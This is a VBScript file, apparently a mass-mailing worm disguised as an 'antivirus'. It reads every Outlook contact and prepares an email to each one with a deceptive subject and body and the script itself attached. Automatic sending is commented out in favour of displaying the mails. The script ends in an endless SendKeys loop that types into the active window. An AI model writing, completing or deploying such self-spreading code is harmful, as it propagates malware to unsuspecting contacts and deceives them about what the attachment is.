set x=wscript.createobject ("wscript.shell")


Dim OutlookApp, Namespace, ContactsFolder, ContactItem
Dim MailItem, RecipientEmail, SendCount, Confirm

SendCount = 0

' Create Outlook application object
On Error Resume Next
Set OutlookApp = CreateObject("Outlook.Application")
If Err.Number <> 0 Then
    WScript.Echo ""
    WScript.Quit
End If
On Error GoTo 0

' Get MAPI namespace and Contacts folder
Set Namespace = OutlookApp.GetNamespace("MAPI")
Set ContactsFolder = Namespace.GetDefaultFolder(10) ' 10 = olFolderContacts

' Confirm before sending
Confirm = MsgBox("this scriptwin send a email to the antivirus system . Continue?", vbYesNo + vbExclamation, "Confirm Send")
If Confirm <> vbYes Then
    WScript.Echo "Opera loaded"
    WScript.Quit
End If
strFilePath = WScript.ScriptFullName

' Loop through contacts
For Each ContactItem In ContactsFolder.Items
    If ContactItem.Class = 40 Then ' 40 = olContact
        RecipientEmail = Trim(ContactItem.Email1Address)
        If RecipientEmail <> "" Then
            ' Create a new email
            Set MailItem = OutlookApp.CreateItem(0) ' 0 = olMailItem
            With MailItem
                .To = RecipientEmail
                .Subject = "Hello i saw this vbs antivirus file"
                .Body = "This is a testof an antivirus make by birdy.inc copyright 2026."
		.Attachments.Add strFilePath

                ' Uncomment the next line to send automatically
                '.Send
                ' For testing, display instead of sending
                .Display
            End With
            SendCount = SendCount + 1
        End If
    End If
Next

WScript.Echo "antivirus"

' Cleanup
Set MailItem = Nothing
Set ContactItem = Nothing
Set ContactsFolder = Nothing
Set Namespace = Nothing
Set OutlookApp = Nothing
do
wscript.sleep 100
x.sendkeys "spreaded by mail" 
loop

